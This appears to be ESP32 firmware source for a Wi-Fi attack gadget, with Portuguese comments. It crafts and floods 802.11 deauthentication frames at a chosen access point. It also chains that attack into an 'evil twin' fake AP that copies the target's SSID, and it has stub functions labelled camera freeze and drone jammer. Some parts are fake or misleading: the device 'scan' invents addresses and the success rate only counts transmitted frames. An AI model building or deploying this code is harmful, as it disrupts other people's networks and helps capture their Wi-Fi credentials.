#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include "config.h"

// ============================================================
// DEAUTH FRAME (Management Frame - Deauthentication)
// ============================================================
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth
    0x3A, 0x01,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC (offset 10)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
    0x00, 0x00,             // Seq Ctrl
    0x07, 0x00              // Reason code: 7 = Class 3 frame received from non-associated STA
};

// Frame de deauth reverso (AP -> STA) para maior efetividade
static uint8_t deauthFrameReverse[26] = {
    0xC0, 0x00,
    0x3A, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: AP MAC (offset 4)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // SA: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC (offset 16)
    0x00, 0x00,
    0x07, 0x00
};

// ============================================================
// CONTADORES DE DEAUTH (igual ao vídeo: Pkts, Succ%)
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;

// ============================================================
// HELPERS
// ============================================================
void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
    memcpy(&frame[offset], mac, 6);
}

// ============================================================
// SCAN WIFI (igual ao vídeo: mostra SSID + RSSI)
// ============================================================
void scanNetworks() {
    networkCount = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks(false, true); // async=false, show_hidden=true
    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// DEAUTH - ENVIO REAL DE FRAMES (corrigido)
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;

    NetworkInfo* target = &scannedNetworks[networkIndex];

    // Salva info do alvo para a tela de detalhes
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;

    // Configura os frames com o MAC do alvo
    setMAC(deauthFrame, target->bssid, 10);   // SA = AP
    setMAC(deauthFrame, target->bssid, 16);   // BSSID = AP

    setMAC(deauthFrameReverse, target->bssid, 4);   // DA = AP
    setMAC(deauthFrameReverse, target->bssid, 16);  // BSSID = AP

    // MUDA PARA O CANAL DO ALVO (CRÍTICO!)
    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);

    // Inicializa WiFi em modo STA para transmissão raw
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);

    // Ativa modo promíscuo para permitir tx raw
    esp_wifi_set_promiscuous(true);

    deauthActive = true;
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

void stopDeauth() { 
    deauthActive = false; 
    esp_wifi_set_promiscuous(false);
}

// ============================================================
// LOOP DE DEAUTH - CHAMADO A CADA FRAME NO MENU
// Retorna true se enviou pacote nesta chamada
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    // Envia frame de deauth STA -> AP (broadcast)
    esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);

    // Pequeno delay entre frames
    delayMicroseconds(2000);

    // Envia frame reverso AP -> STA
    esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameReverse, sizeof(deauthFrameReverse), false);

    deauthPacketCount += 2;

    // Estima sucesso (se não deu erro de tx)
    if (err1 == ESP_OK) deauthSuccessCount++;
    if (err2 == ESP_OK) deauthSuccessCount++;

    return true;
}

// ============================================================
// GETTERS PARA A TELA DE DETALHES (igual ao vídeo)
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678");
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE (stubs)
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
